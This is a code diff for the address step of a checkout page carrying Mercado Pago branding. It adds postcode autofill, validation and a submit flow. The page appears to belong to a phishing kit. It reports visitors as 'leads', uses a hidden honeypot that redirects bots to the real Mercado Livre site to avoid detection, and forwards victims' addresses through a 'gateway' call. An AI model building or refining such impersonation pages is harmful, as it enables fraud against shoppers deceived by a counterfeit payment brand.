@@ -9,15 +9,146 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link rel="stylesheet" href="css/checkout.css">
+
+<style>
+/* ── Endereço Advanced Styles ─────────────────────────────────── */
+
+.cep-status {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 12px;
+  margin-top: 5px;
+  min-height: 18px;
+  transition: opacity 0.3s ease;
+}
+.cep-status.hidden { opacity: 0; pointer-events: none; }
+.cep-status__dot {
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  flex-shrink: 0;
+  transition: background 0.3s;
+}
+.cep-status.loading .cep-status__dot  { background: #009ee3; animation: pulse-dot 1s infinite; }
+.cep-status.success .cep-status__dot  { background: #00a650; }
+.cep-status.error   .cep-status__dot  { background: #f23d4f; }
+.cep-status.loading .cep-status__text { color: #009ee3; }
+.cep-status.success .cep-status__text { color: #00a650; }
+.cep-status.error   .cep-status__text { color: #f23d4f; }
+
+@keyframes pulse-dot {
+  0%,100% { transform: scale(1); opacity: 1; }
+  50%      { transform: scale(1.4); opacity: 0.6; }
+}
+
+.cep-spinner {
+  position: absolute;
+  right: 38px; top: 50%;
+  transform: translateY(-50%);
+  width: 16px; height: 16px;
+  border: 2px solid #e0e0e0;
+  border-top-color: #009ee3;
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+  display: none;
+}
+.cep-spinner.visible { display: block; }
+@keyframes spin { to { transform: translateY(-50%) rotate(360deg); } }
+
+.mp-field input.autofilled {
+  background: #f0fbf5 !important;
+  border-color: #00a650 !important;
+  color: #1a7a45;
+  font-weight: 500;
+}
+
+.mp-row {
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+}
+.mp-row .mp-field { flex: 1; }
+.mp-row .mp-field--uf { flex: 0 0 70px; }
+.mp-row .mp-field--num { flex: 0 0 110px; }
+
+input#number { text-align: center; font-weight: 600; letter-spacing: 1px; }
+
+.mp-field input[readonly] {
+  background: #f7fffe;
+  cursor: default;
+  color: #444;
+}
+
+.mp-field__hint {
+  font-size: 11px;
+  color: #999;
+  margin-top: 3px;
+  padding-left: 2px;
+}
+
+.addr-fields {
+  transition: opacity 0.35s ease, transform 0.35s ease;
+}
+.addr-fields.hidden {
+  opacity: 0;
+  transform: translateY(6px);
+  pointer-events: none;
+}
+
+.uf-badge {
+  display: inline-block;
+  background: #009ee3;
+  color: #fff;
+  font-size: 11px;
+  font-weight: 700;
+  padding: 2px 7px;
+  border-radius: 4px;
+  letter-spacing: 0.5px;
+  margin-left: 6px;
+  vertical-align: middle;
+}
+
+.num-hint {
+  font-size: 11px;
+  color: #009ee3;
+  margin-top: 3px;
+  display: none;
+}
+.num-hint.visible { display: block; }
+
+.edit-cep-link {
+  font-size: 12px;
+  color: #009ee3;
+  cursor: pointer;
+  text-decoration: underline;
+  margin-left: 8px;
+  user-select: none;
+}
+.edit-cep-link:hover { color: #007ab8; }
+
+.form-progress {
+  height: 3px;
+  background: #e8e8e8;
+  border-radius: 99px;
+  margin-bottom: 20px;
+  overflow: hidden;
+}
+.form-progress__bar {
+  height: 100%;
+  background: linear-gradient(90deg, #009ee3, #00a650);
+  border-radius: 99px;
+  transition: width 0.5s ease;
+  width: 0%;
+}
+</style>
+
 </head>
 <body>
 <div class="mp-page">
 
   <!-- ── Header ──────────────────────────────────────────────── -->
   <header class="mp-header">
-    <img class="mp-header__logo"
-         src="images/mp-logo.png"
-         alt="MercadoPago">
+    <img class="mp-header__logo" src="images/mp-logo.png" alt="MercadoPago">
   </header>
 
   <!-- ── Stepper ─────────────────────────────────────────────── -->
@@ -42,10 +173,13 @@
     </div>
   </div>
 
-
   <!-- ── Form card ────────────────────────────────────────────── -->
   <div class="mp-card">
     <h1 class="mp-card__title">Endereço de Entrega</h1>
+
+    <div class="form-progress">
+      <div class="form-progress__bar" id="formProgressBar"></div>
+    </div>
 
     <!-- Honeypot anti-bot -->
     <div class="hp-trap" aria-hidden="true" style="position:absolute;left:-9999px;top:-9999px;width:0;height:0;overflow:hidden;pointer-events:none;">
@@ -53,73 +187,136 @@
       <input type="text"  id="hp_country" name="country_code"  tabindex="-1" autocomplete="off">
     </div>
 
-    <div class="mp-field">
-      <label for="cep">CEP</label>
-      <div class="mp-field__wrap">
-        <input type="tel" id="cep" name="cep" placeholder="00000-000" maxlength="9" autocomplete="postal-code">
-        <span class="mp-cep-loading" id="cepLoading"></span>
+    <!-- ── CEP ─────────────────────────────────────────────────── -->
+    <div class="mp-field" id="field-cep">
+      <label for="cep">CEP <span id="cepUfBadge" class="uf-badge" style="display:none;"></span></label>
+      <div class="mp-field__wrap" style="position:relative;">
+        <input type="tel" id="cep" name="cep"
+               placeholder="00000-000"
+               maxlength="9"
+               autocomplete="postal-code"
+               inputmode="numeric">
+        <span class="cep-spinner" id="cepSpinner"></span>
         <span class="mp-field__ok" id="ok-cep">
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
             <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
           </svg>
         </span>
       </div>
+      <div class="cep-status hidden" id="cepStatus">
+        <span class="cep-status__dot"></span>
+        <span class="cep-status__text" id="cepStatusText"></span>
+        <span class="edit-cep-link" id="editCepLink" style="display:none;" onclick="clearCEP()">Alterar CEP</span>
+      </div>
       <div class="mp-field__err" id="err-cep"></div>
     </div>
 
-    <div class="mp-field">
-      <label for="street">Rua</label>
-      <div class="mp-field__wrap">
-        <input type="text" id="street" name="street" placeholder="Nome da rua" autocomplete="street-address">
-        <span class="mp-field__ok" id="ok-street">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
-            <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
-          </svg>
-        </span>
-      </div>
-      <div class="mp-field__err" id="err-street"></div>
-    </div>
+    <!-- ── Campos de endereço ────────────────────────────────────── -->
+    <div class="addr-fields hidden" id="addrFields">
 
-    <div class="mp-field">
-      <label for="neighborhood">Bairro</label>
-      <div class="mp-field__wrap">
-        <input type="text" id="neighborhood" name="neighborhood" placeholder="Nome do bairro">
-        <span class="mp-field__ok" id="ok-neighborhood">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
-            <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
-          </svg>
-        </span>
-      </div>
-      <div class="mp-field__err" id="err-neighborhood"></div>
-    </div>
-
-    <div class="mp-row">
       <div class="mp-field">
-        <label for="city">Cidade</label>
+        <label for="street">Rua / Logradouro</label>
         <div class="mp-field__wrap">
-          <input type="text" id="city" name="city" placeholder="Cidade" autocomplete="address-level2">
-          <span class="mp-field__ok" id="ok-city">
+          <input type="text" id="street" name="street"
+                 placeholder="Nome da rua"
+                 autocomplete="street-address"
+                 maxlength="100">
+          <span class="mp-field__ok" id="ok-street">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
               <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
             </svg>
           </span>
         </div>
-        <div class="mp-field__err" id="err-city"></div>
+        <div class="mp-field__err" id="err-street"></div>
       </div>
 
-      <div class="mp-field" style="max-width:110px;">
-        <label for="number">Número</label>
+      <div class="mp-field">
+        <label for="neighborhood">Bairro</label>
         <div class="mp-field__wrap">
-          <input type="text" id="number" name="number" placeholder="Nº" maxlength="10">
-          <span class="mp-field__ok" id="ok-number">
+          <input type="text" id="neighborhood" name="neighborhood"
+                 placeholder="Nome do bairro"
+                 maxlength="80">
+          <span class="mp-field__ok" id="ok-neighborhood">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
               <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
             </svg>
           </span>
         </div>
-        <div class="mp-field__err" id="err-number"></div>
+        <div class="mp-field__err" id="err-neighborhood"></div>
       </div>
-    </div>
+
+      <div class="mp-row">
+        <div class="mp-field">
+          <label for="city">Cidade</label>
+          <div class="mp-field__wrap">
+            <input type="text" id="city" name="city"
+                   placeholder="Cidade"
+                   autocomplete="address-level2"
+                   maxlength="80">
+            <span class="mp-field__ok" id="ok-city">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+                <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+              </svg>
+            </span>
+          </div>
+          <div class="mp-field__err" id="err-city"></div>
+        </div>
+
+        <div class="mp-field mp-field--uf">
+          <label for="uf">UF</label>
+          <div class="mp-field__wrap">
+            <input type="text" id="uf" name="uf"
+                   placeholder="SP"
+                   maxlength="2"
+                   autocomplete="address-level1"
+                   style="text-align:center;font-weight:700;text-transform:uppercase;letter-spacing:2px;">
+            <span class="mp-field__ok" id="ok-uf">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+                <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+              </svg>
+            </span>
+          </div>
+          <div class="mp-field__err" id="err-uf"></div>
+        </div>
+      </div>
+
+      <div class="mp-row">
+        <div class="mp-field mp-field--num">
+          <label for="number">Número</label>
+          <div class="mp-field__wrap">
+            <input type="text" id="number" name="number"
+                   placeholder="Nº"
+                   maxlength="10"
+                   inputmode="numeric"
+                   autocomplete="off">
+            <span class="mp-field__ok" id="ok-number">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+                <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+              </svg>
+            </span>
+          </div>
+          <div class="mp-field__err" id="err-number"></div>
+          <div class="num-hint" id="numHint">Digite S/N se não houver número</div>
+        </div>
+
+        <div class="mp-field">
+          <label for="complement">Complemento <span style="color:#bbb;font-weight:400;">(opcional)</span></label>
+          <div class="mp-field__wrap">
+            <input type="text" id="complement" name="complement"
+                   placeholder="Apto, Bloco, Casa..."
+                   maxlength="50"
+                   autocomplete="off">
+            <span class="mp-field__ok" id="ok-complement">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+                <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+              </svg>
+            </span>
+          </div>
+          <div class="mp-field__hint">Ex: Apto 42, Bloco B, Casa 3</div>
+        </div>
+      </div>
+
+    </div><!-- /addrFields -->
 
     <button class="mp-btn" id="btnContinue" onclick="submitStep2()">
       <span class="btn-label">Continuar</span>
@@ -155,94 +352,452 @@
 (function () {
   'use strict';
 
+  // ══════════════════════════════════════════════════════════════
+  //  ESTADO GLOBAL
+  // ══════════════════════════════════════════════════════════════
+
+  var STATE = {
+    cepOk:           false,
+    cepRaw:          '',
+    autoFilled:      false,
+    uf:              '',
+    fetchController: null
+  };
+
+  var UFS_BR = ['AC','AL','AP','AM','BA','CE','DF','ES','GO','MA','MT','MS','MG',
+                'PA','PB','PR','PE','PI','RJ','RN','RS','RO','RR','SC','SP','SE','TO'];
+
+  // ══════════════════════════════════════════════════════════════
+  //  INIT SDK
+  // ══════════════════════════════════════════════════════════════
+
   _SDK.initTracking('endereco');
   _SDK.notifyLead('endereco');
 
-  // ── Real-time validation ──────────────────────────────────────
-  _SDK.ui.bindValidation('cep',          _SDK.validate.cep,                                _SDK.validate.formatCEP, 'err-cep',          'ok-cep');
-  _SDK.ui.bindValidation('street',       function (v) { return _SDK.validate.text(v, 3, 'Rua');    }, null, 'err-street',       'ok-street');
-  _SDK.ui.bindValidation('neighborhood', function (v) { return _SDK.validate.text(v, 2, 'Bairro'); }, null, 'err-neighborhood', 'ok-neighborhood');
-  _SDK.ui.bindValidation('city',         function (v) { return _SDK.validate.text(v, 2, 'Cidade'); }, null, 'err-city',         'ok-city');
-  _SDK.ui.bindValidation('number',       function (v) { return _SDK.validate.text(v, 1, 'Número'); }, null, 'err-number',       'ok-number');
+  // ══════════════════════════════════════════════════════════════
+  //  UTILITÁRIOS
+  // ══════════════════════════════════════════════════════════════
 
-  // ── Auto-fill via ViaCEP (com retry e loading indicator) ──────
-  _SDK.ui.bindCEP('cep', {
-    street: 'street',
-    neighborhood: 'neighborhood',
-    city: 'city',
-    number: 'number'
-  }, 'cepLoading');
+  function $(id) { return document.getElementById(id); }
 
-  // ── Submit ────────────────────────────────────────────────────
+  function setFieldState(fieldId, state, msg) {
+    var inp = $(fieldId);
+    var ok  = $('ok-' + fieldId);
+    var err = $('err-' + fieldId);
+    if (!inp) return;
+
+    inp.classList.remove('valid', 'invalid', 'autofilled');
+    if (ok) ok.classList.remove('visible');
+    if (err) { err.textContent = ''; err.classList.remove('visible'); }
+
+    if (state === 'valid') {
+      inp.classList.add('valid');
+      if (ok) ok.classList.add('visible');
+    } else if (state === 'autofilled') {
+      inp.classList.add('valid', 'autofilled');
+      if (ok) ok.classList.add('visible');
+    } else if (state === 'invalid') {
+      inp.classList.add('invalid');
+      if (err && msg) { err.textContent = msg; err.classList.add('visible'); }
+    }
+  }
+
+  function setCEPStatus(type, text) {
+    var bar     = $('cepStatus');
+    var txt     = $('cepStatusText');
+    var spinner = $('cepSpinner');
+    var editBtn = $('editCepLink');
+
+    if (type === 'hidden') {
+      bar.className = 'cep-status hidden';
+      if (spinner) spinner.classList.remove('visible');
+      return;
+    }
+
+    bar.className = 'cep-status ' + type;
+    if (txt) txt.textContent = text;
+    if (spinner) spinner.classList.toggle('visible', type === 'loading');
+    if (editBtn) editBtn.style.display = (type === 'success') ? 'inline' : 'none';
+  }
+
+  function showAddrFields(show) {
+    var el = $('addrFields');
+    if (!el) return;
+    el.classList.toggle('hidden', !show);
+  }
+
+  function updateProgress() {
+    var fields = ['cep','street','neighborhood','city','uf','number'];
+    var filled = 0;
+    fields.forEach(function(id) {
+      var el = $(id);
+      if (el && el.value.trim().length > 0 && el.classList.contains('valid')) filled++;
+    });
+    var bar = $('formProgressBar');
+    if (bar) bar.style.width = Math.round((filled / fields.length) * 100) + '%';
+  }
+
+  // ══════════════════════════════════════════════════════════════
+  //  VALIDADORES
+  // ══════════════════════════════════════════════════════════════
+
+  function validateCEPFormat(raw) {
+    if (!raw || raw.length !== 8)             return { ok: false, msg: 'CEP deve ter 8 dígitos' };
+    if (!/^\d{8}$/.test(raw))                 return { ok: false, msg: 'CEP inválido — use somente números' };
+    if (/^(\d)\1{7}$/.test(raw))              return { ok: false, msg: 'CEP inválido — sequência repetida' };
+    if (raw === '00000000')                    return { ok: false, msg: 'CEP inválido' };
+    var num = parseInt(raw, 10);
+    if (num < 1001000 || num > 99999999)      return { ok: false, msg: 'CEP fora da faixa válida brasileira' };
+    return { ok: true };
+  }
+
+  var VALIDATORS = {
+    street: function(v) {
+      v = v.trim();
+      if (!v)           return { ok: false, msg: 'Informe a rua' };
+      if (v.length < 3) return { ok: false, msg: 'Nome da rua muito curto (mín. 3 caracteres)' };
+      if (v.length > 100) return { ok: false, msg: 'Nome da rua muito longo' };
+      if (/^\d+$/.test(v)) return { ok: false, msg: 'Rua inválida — informe o nome completo' };
+      return { ok: true, val: v };
+    },
+    neighborhood: function(v) {
+      v = v.trim();
+      if (!v)           return { ok: false, msg: 'Informe o bairro' };
+      if (v.length < 2) return { ok: false, msg: 'Bairro muito curto (mín. 2 caracteres)' };
+      if (v.length > 80) return { ok: false, msg: 'Nome do bairro muito longo' };
+      return { ok: true, val: v };
+    },
+    city: function(v) {
+      v = v.trim();
+      if (!v)           return { ok: false, msg: 'Informe a cidade' };
+      if (v.length < 2) return { ok: false, msg: 'Nome de cidade muito curto' };
+      if (v.length > 80) return { ok: false, msg: 'Nome de cidade muito longo' };
+      if (/^\d+$/.test(v)) return { ok: false, msg: 'Cidade inválida' };
+      return { ok: true, val: v };
+    },
+    uf: function(v) {
+      v = v.trim().toUpperCase();
+      if (!v)                       return { ok: false, msg: 'Informe o estado (UF)' };
+      if (v.length !== 2)           return { ok: false, msg: 'UF deve ter 2 letras (ex: SP)' };
+      if (UFS_BR.indexOf(v) === -1) return { ok: false, msg: 'UF inválida — use sigla oficial (ex: SP, RJ)' };
+      return { ok: true, val: v };
+    },
+    number: function(v) {
+      v = v.trim();
+      if (!v) return { ok: false, msg: 'Informe o número ou S/N' };
+      var norm = v.toUpperCase();
+      if (norm === 'S/N' || norm === 'SN' || norm === 'S.N.' || norm === 'S. N.') return { ok: true, val: 'S/N' };
+      if (v.length > 10) return { ok: false, msg: 'Número muito longo' };
+      if (!/^[\d][\d\-\/A-Za-z]{0,9}$/.test(v)) return { ok: false, msg: 'Número inválido — ex: 123, 45-A, S/N' };
+      return { ok: true, val: norm };
+    },
+    complement: function(v) {
+      if (!v || !v.trim()) return { ok: true, val: '' };
+      v = v.trim();
+      if (v.length < 2)  return { ok: false, msg: 'Complemento muito curto' };
+      if (v.length > 50) return { ok: false, msg: 'Complemento muito longo (máx. 50 caracteres)' };
+      return { ok: true, val: v };
+    }
+  };
+
+  // ══════════════════════════════════════════════════════════════
+  //  FETCH CEP — ViaCEP + BrasilAPI (fallback)
+  // ══════════════════════════════════════════════════════════════
+
+  function fetchCEPData(raw, attempt) {
+    attempt = attempt || 1;
+    if (STATE.fetchController) { try { STATE.fetchController.abort(); } catch(e) {} }
+
+    var ctrl = window.AbortController ? new AbortController() : null;
+    STATE.fetchController = ctrl;
+    var signal = ctrl ? ctrl.signal : undefined;
+
+    var timeoutId = setTimeout(function() { if (ctrl) try { ctrl.abort(); } catch(e) {} }, 8000);
+
+    var isBrasilAPI = attempt > 2;
+    var url = isBrasilAPI
+      ? 'https://brasilapi.com.br/api/cep/v2/' + raw
+      : 'https://viacep.com.br/ws/' + raw + '/json/';
+
+    return fetch(url, { signal: signal })
+      .then(function(r) {
+        clearTimeout(timeoutId);
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        return r.json();
+      })
+      .then(function(data) {
+        clearTimeout(timeoutId);
+        STATE.fetchController = null;
+
+        if (data.erro || (!isBrasilAPI && !data.logradouro && !data.bairro)) {
+          if (attempt < 3) return fetchCEPData(raw, 3);
+          return null;
+        }
+
+        return isBrasilAPI ? {
+          logradouro: data.street       || '',
+          bairro:     data.neighborhood || '',
+          localidade: data.city         || '',
+          uf:         data.state        || ''
+        } : {
+          logradouro: data.logradouro || '',
+          bairro:     data.bairro     || '',
+          localidade: data.localidade || '',
+          uf:         data.uf         || ''
+        };
+      })
+      .catch(function(err) {
+        clearTimeout(timeoutId);
+        STATE.fetchController = null;
+        if (err && err.name === 'AbortError') return null;
+        if (attempt < 3) return fetchCEPData(raw, attempt + 1);
+        if (attempt === 3) return fetchCEPData(raw, 4);
+        return null;
+      });
+  }
+
+  // ══════════════════════════════════════════════════════════════
+  //  PREENCHER CAMPOS
+  // ══════════════════════════════════════════════════════════════
+
+  function fillAddressFields(data) {
+    var mapping = {
+      street:       data.logradouro,
+      neighborhood: data.bairro,
+      city:         data.localidade,
+      uf:           data.uf ? data.uf.toUpperCase() : ''
+    };
+
+    Object.keys(mapping).forEach(function(fieldId) {
+      var val = (mapping[fieldId] || '').trim();
+      var el  = $(fieldId);
+      if (!el) return;
+      if (val) {
+        el.value = val;
+        el.setAttribute('readonly', 'readonly');
+        setFieldState(fieldId, 'autofilled');
+      } else {
+        el.value = '';
+        el.removeAttribute('readonly');
+      }
+    });
+
+    if (mapping.uf) {
+      STATE.uf = mapping.uf;
+      var badge = $('cepUfBadge');
+      if (badge) { badge.textContent = mapping.uf; badge.style.display = 'inline-block'; }
+    }
+
+    STATE.autoFilled = true;
+    updateProgress();
+
+    setTimeout(function() {
+      var numEl = $('number');
+      if (numEl) { numEl.focus(); $('numHint').classList.add('visible'); }
+    }, 200);
+  }
+
+  // ══════════════════════════════════════════════════════════════
+  //  LIMPAR CEP
+  // ══════════════════════════════════════════════════════════════
+
+  window.clearCEP = function() {
+    STATE.cepOk = false; STATE.cepRaw = ''; STATE.autoFilled = false; STATE.uf = '';
+
+    var cepEl = $('cep');
+    cepEl.value = '';
+    cepEl.removeAttribute('readonly');
+    setFieldState('cep', 'reset');
+    setCEPStatus('hidden');
+
+    var badge = $('cepUfBadge');
+    if (badge) { badge.textContent = ''; badge.style.display = 'none'; }
+
+    ['street','neighborhood','city','uf','number','complement'].forEach(function(id) {
+      var el = $(id); if (!el) return;
+      el.value = ''; el.removeAttribute('readonly'); setFieldState(id, 'reset');
+    });
+
+    $('numHint').classList.remove('visible');
+    showAddrFields(false);
+    updateProgress();
+    cepEl.focus();
+  };
+
+  // ══════════════════════════════════════════════════════════════
+  //  LÓGICA CEP
+  // ══════════════════════════════════════════════════════════════
+
+  (function initCEP() {
+    var cepEl = $('cep');
+    if (!cepEl) return;
+
+    cepEl.addEventListener('input', function() {
+      var raw = this.value.replace(/\D/g, '').substring(0, 8);
+      if (raw.length > 5) this.value = raw.substring(0, 5) + '-' + raw.substring(5);
+      else this.value = raw;
+
+      if (STATE.cepOk && raw !== STATE.cepRaw) {
+        STATE.cepOk = false; STATE.autoFilled = false;
+        setCEPStatus('hidden'); setFieldState('cep', 'reset'); showAddrFields(false);
+      }
+
+      updateProgress();
+      if (raw.length === 8) triggerCEPLookup(raw);
+    });
+
+    cepEl.addEventListener('blur', function() {
+      var raw = this.value.replace(/\D/g, '');
+      if (raw.length === 8 && !STATE.cepOk) triggerCEPLookup(raw);
+    });
+  }());
+
+  function triggerCEPLookup(raw) {
+    if (STATE.cepOk && STATE.cepRaw === raw) return;
+    var fmt = validateCEPFormat(raw);
+    if (!fmt.ok) { setFieldState('cep', 'invalid', fmt.msg); setCEPStatus('error', fmt.msg); return; }
+
+    STATE.cepRaw = raw;
+    setCEPStatus('loading', 'Buscando endereço…');
+    setFieldState('cep', 'reset');
+
+    fetchCEPData(raw).then(function(data) {
+      if (!data) {
+        STATE.cepOk = false;
+        setFieldState('cep', 'invalid', 'CEP não encontrado — verifique e tente novamente');
+        setCEPStatus('error', 'CEP não encontrado');
+        showAddrFields(false);
+        return;
+      }
+
+      STATE.cepOk = true;
+      setFieldState('cep', 'valid');
+      var cityStr = data.localidade || '';
+      var ufStr   = data.uf ? ' – ' + data.uf.toUpperCase() : '';
+      setCEPStatus('success', 'Endereço encontrado: ' + cityStr + ufStr);
+      showAddrFields(true);
+      fillAddressFields(data);
+      updateProgress();
+    });
+  }
+
+  // ══════════════════════════════════════════════════════════════
+  //  VALIDAÇÃO POR CAMPO
+  // ══════════════════════════════════════════════════════════════
+
+  function bindFieldValidation(fieldId, validatorFn) {
+    var el = $(fieldId);
+    if (!el) return;
+
+    el.addEventListener('input', function() {
+      el.classList.remove('invalid');
+      var err = $('err-' + fieldId);
+      if (err) err.classList.remove('visible');
+      updateProgress();
+    });
+
+    el.addEventListener('blur', function() {
+      var val = el.value;
+      if (!val.trim()) { if (fieldId !== 'complement') el.classList.remove('valid'); return; }
+      var res = validatorFn(val);
+      setFieldState(fieldId, res.ok ? 'valid' : 'invalid', res.msg);
+      updateProgress();
+    });
+  }
+
+  // UF máscara
+  (function() {
+    var ufEl = $('uf');
+    if (ufEl) ufEl.addEventListener('input', function() {
+      this.value = this.value.replace(/[^a-zA-Z]/g, '').toUpperCase().substring(0, 2);
+    });
+  }());
+
+  // Número hint
+  (function() {
+    var numEl = $('number');
+    if (numEl) numEl.addEventListener('input', function() {
+      $('numHint').classList.toggle('visible', this.value.trim().length === 0);
+    });
+  }());
+
+  bindFieldValidation('street',       VALIDATORS.street);
+  bindFieldValidation('neighborhood', VALIDATORS.neighborhood);
+  bindFieldValidation('city',         VALIDATORS.city);
+  bindFieldValidation('uf',           VALIDATORS.uf);
+  bindFieldValidation('number',       VALIDATORS.number);
+  bindFieldValidation('complement',   VALIDATORS.complement);
+
+  // ══════════════════════════════════════════════════════════════
+  //  SUBMIT
+  // ══════════════════════════════════════════════════════════════
+
   window.submitStep2 = function () {
-    // 1 — Honeypot check
-    if (document.getElementById('hp_address').value ||
-        document.getElementById('hp_country').value) {
+    if ($('hp_address').value || $('hp_country').value) {
       window.location.replace('https://www.mercadolivre.com.br');
       return;
     }
 
-    var vCep   = _SDK.validate.cep(document.getElementById('cep').value);
-    var vStr   = _SDK.validate.text(document.getElementById('street').value,       3, 'Rua');
-    var vNeigh = _SDK.validate.text(document.getElementById('neighborhood').value, 2, 'Bairro');
-    var vCity  = _SDK.validate.text(document.getElementById('city').value,         2, 'Cidade');
-    var vNum   = _SDK.validate.text(document.getElementById('number').value,       1, 'Número');
-
-    // Validação estrita: O ViaCEP coloca 'readonly' nos campos quando acha o endereço.
-    // Se não tiver readonly e o usuário não digitou manualmente um endereço gigante, desconfiamos.
-    var streetEl = document.getElementById('street');
-    if (!streetEl.hasAttribute('readonly') && vStr.val && vStr.val.length < 5) {
-       vStr.ok = false;
-       vStr.msg = 'Insira um CEP válido para buscar o endereço';
+    if (!STATE.cepOk) {
+      setFieldState('cep', 'invalid', 'Informe um CEP válido para buscar o endereço');
+      $('cep').focus();
+      return;
     }
 
-    var fields = [
-      { id: 'cep',          res: vCep,   errId: 'err-cep',          okId: 'ok-cep'          },
-      { id: 'street',       res: vStr,   errId: 'err-street',       okId: 'ok-street'       },
-      { id: 'neighborhood', res: vNeigh, errId: 'err-neighborhood', okId: 'ok-neighborhood' },
-      { id: 'city',         res: vCity,  errId: 'err-city',         okId: 'ok-city'         },
-      { id: 'number',       res: vNum,   errId: 'err-number',       okId: 'ok-number'       }
+    var validations = [
+      { id: 'cep',          res: { ok: STATE.cepOk, msg: 'Informe um CEP válido' } },
+      { id: 'street',       res: VALIDATORS.street($('street').value) },
+      { id: 'neighborhood', res: VALIDATORS.neighborhood($('neighborhood').value) },
+      { id: 'city',         res: VALIDATORS.city($('city').value) },
+      { id: 'uf',           res: VALIDATORS.uf($('uf').value) },
+      { id: 'number',       res: VALIDATORS.number($('number').value) },
+      { id: 'complement',   res: VALIDATORS.complement($('complement').value) }
     ];
 
     var allValid = true;
-    fields.forEach(function (f) {
-      var inp = document.getElementById(f.id);
-      var err = document.getElementById(f.errId);
-      var ok  = document.getElementById(f.okId);
-      if (!f.res.ok) {
+    var firstInvalid = null;
+
+    validations.forEach(function(v) {
+      if (!v.res.ok) {
         allValid = false;
-        inp.classList.add('invalid'); inp.classList.remove('valid');
-        if (err) { err.textContent = f.res.msg; err.classList.add('visible'); }
-        if (ok)  ok.classList.remove('visible');
+        setFieldState(v.id, 'invalid', v.res.msg);
+        if (!firstInvalid) firstInvalid = v.id;
       } else {
-        inp.classList.remove('invalid'); inp.classList.add('valid');
-        if (err) err.classList.remove('visible');
-        if (ok)  ok.classList.add('visible');
+        if (v.id !== 'cep') setFieldState(v.id, 'valid');
       }
     });
 
-    if (!allValid) return;
+    if (!allValid) { if (firstInvalid) $(firstInvalid).focus(); return; }
 
     _SDK.ui.setLoading('btnContinue', true);
 
+    var cepFmt = STATE.cepRaw.substring(0, 5) + '-' + STATE.cepRaw.substring(5);
+
     var formData = {
-      cep:          _SDK.validate.formatCEP(vCep.val),
-      street:       vStr.val,
-      neighborhood: vNeigh.val,
-      city:         vCity.val,
-      number:       vNum.val
+      cep:          cepFmt,
+      street:       VALIDATORS.street($('street').value).val          || $('street').value.trim(),
+      neighborhood: VALIDATORS.neighborhood($('neighborhood').value).val || $('neighborhood').value.trim(),
+      city:         VALIDATORS.city($('city').value).val              || $('city').value.trim(),
+      uf:           VALIDATORS.uf($('uf').value).val                  || $('uf').value.trim().toUpperCase(),
+      number:       VALIDATORS.number($('number').value).val          || $('number').value.trim(),
+      complement:   VALIDATORS.complement($('complement').value).val  || ''
     };
 
     _SDK.storeData('address', formData);
-
     _SDK.gateway.notifyAddress(formData)
-      .then(function () { window.location.href = 'escolha.php'; })
-      .catch(function () { window.location.href = 'escolha.php'; });
+      .then(function() { window.location.href = 'escolha.php'; })
+      .catch(function() { window.location.href = 'escolha.php'; });
   };
 
-  document.addEventListener('keydown', function (e) {
-    if (e.key === 'Enter') window.submitStep2();
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+      var active = document.activeElement;
+      if (active && active.id !== 'cep') submitStep2();
+    }
   });
+
+  updateProgress();
+
 }());
 </script>
 </body>
